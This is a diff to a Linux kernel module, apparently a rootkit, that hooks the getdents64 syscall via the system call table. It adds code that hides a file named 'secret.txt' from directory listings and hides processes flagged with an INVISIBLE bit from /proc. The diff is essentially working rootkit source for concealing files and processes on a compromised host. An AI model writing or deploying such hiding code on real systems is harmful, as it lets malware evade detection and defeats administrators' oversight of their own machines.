@@ -6,19 +6,66 @@
 #include <linux/semaphore.h>
 #include <linux/dirent.h>
 #include <asm/cacheflush.h>
+#include <linux/version.h>
 #include <linux/kallsyms.h>
-char *file_name =  "secret.txt";
-
+#include <linux/sched/signal.h>
+#include <linux/proc_ns.h>
+#include <linux/fs_struct.h>
+#include <asm/current.h>
+#include <linux/sched.h>
+#include <linux/security.h>
+#define INVISIBLE 0x10000000
+#define HIDE_ME "secret.txt"
+struct files_struct;
 unsigned long *sys_call_table;
-asmlinkage long unsigned int (*org_getdents64) (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
-asmlinkage int sys_getdents64_hook (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
+asmlinkage long unsigned (*org_getdents64) (unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
+struct task_struct * find_task(pid_t pid)
 {
-    int rtn;
-    struct linux_dirent64 *cur = dirp;
-    int i =0;
+    struct task_struct *p = current;
+    for_each_process(p){
+        if (p->pid == pid)
+            return p;
+    }
+    return NULL;
+}
+int is_invisible(pid_t pid)
+{
+    struct task_struct *task;
+    if (!pid)
+        return 0;
+    task = find_task(pid);
+    if (!task)
+        return 0;
+    if (task->flags & INVISIBLE)
+        return 1;
+    return 0;
+}
+asmlinkage long sys_getdents64_hook (unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count)
+{
+    int ret = org_getdents64(fd, dirent, count), err, proc =0;
+    struct linux_dirent64 *dir, *kdirent, *prev =NULL;
+    struct inode* d_inode;
+    unsigned long i =0;
+    #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
+        d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
+    #else
+	    d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
+    #endif
+
     //using the real syscall for getting the info
-    rtn = org_getdents64(fd, dirp, count);
-    while (i < rtn)
+    if (ret <=0)
+        return ret;
+    kdirent = kvzalloc(ret, GFP_KERNEL); //alloc memory to kdirent
+    if (kdirent == NULL)
+        return ret;
+    err = copy_from_user(kdirent, dirent, ret);//copy from user space: >ret< from >dirent< to >kdirent<
+    if (err)
+        goto out;
+    
+    if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
+        proc = 1;
+
+    while (i < ret)
     {
         /*
         //######
@@ -28,26 +75,28 @@ asmlinkage int sys_getdents64_hook (unsigned int fd, struct linux_dirent64 *dirp
          file we recive from getdents, we take his struct member d_name (which contain the file name) 
          and then we compre it to the file name that we want to hide. if thier equal we get rid with that 
          (explain later how) and then contiune*/
-
-        printk(KERN_ALERT "running");
+        dir = (void*) kdirent +i;
         // in strcmp return 0 means strings are equal
-        if (strncmp(cur->d_name, file_name, strlen(file_name)) == 0)
-        {    
-            int reclen, len;
-            char *next_rec;     
-            printk(KERN_ALERT "found it!");                                                 
-            //get rid of our file form the syscall
-            reclen = cur->d_reclen; // getting the size of the dirent
-            next_rec = (char *)cur + reclen; //create a char * that will point to the next place in the buffer of dirs   
-            len = (uintptr_t)dirp + rtn - (uintptr_t) next_rec; // calculte the len of this char * inside the struct //uintptr_t
-            memmove(cur, next_rec, len);//copy it to the cur
-            rtn-=reclen; //remove the size of reclen from rtn because we want to get rid of it
-            continue;
+        if (((!proc && (memcmp(HIDE_ME, dir->d_name, strlen(HIDE_ME))) == 0)) || (proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10))))
+        {  
+            if (dir == kdirent){
+                ret -= dir->d_reclen;
+                memmove(dir, (void*)dir + dir->d_reclen, ret);// putting in dir the next dir in the buff
+                printk(KERN_ALERT "found it!");
+                continue;
+            } 
+            prev->d_reclen += dir->d_reclen;
         }
-        i+=cur->d_reclen;
-        cur = (struct linux_dirent64*) ((char *)dirp +i);//update cur
+        else
+            prev = dir;
+        i+=dir->d_reclen;//incrise the offset for the while expersion
     }
-    return rtn;
+    err = copy_to_user(dirent, kdirent, ret);
+    if (err)//using out for regular out and not for error out
+        goto out;
+out:
+    kvfree(kdirent);
+    return ret;
 }
 
 int set_page_write(unsigned long addr)
